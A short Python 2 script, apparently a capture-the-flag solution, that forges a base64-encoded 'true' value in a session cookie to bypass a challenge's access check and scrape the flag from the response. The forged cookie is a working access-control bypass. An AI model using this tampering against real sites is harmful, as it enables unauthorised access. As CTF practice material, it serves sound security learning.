#!/usr/bin/env python
# 
#      TheCybers Team
#        CTF Cookie
# modify cookie by jonatas fil
#
import sys
import requests 
import re



valor = 'dHJ1ZQ=='
cookie = 'estadoislamico'

s = requests.Session()

s.cookies.update({'estadoislamico':'dHJ1ZQo='})

r = s.get('http://ctf.sucurihc.org/flags/axt/win.php')
content = r.text

matched = re.search('SHC{.*}', content)
if matched:
  print "your flag is:"
  print matched.group()
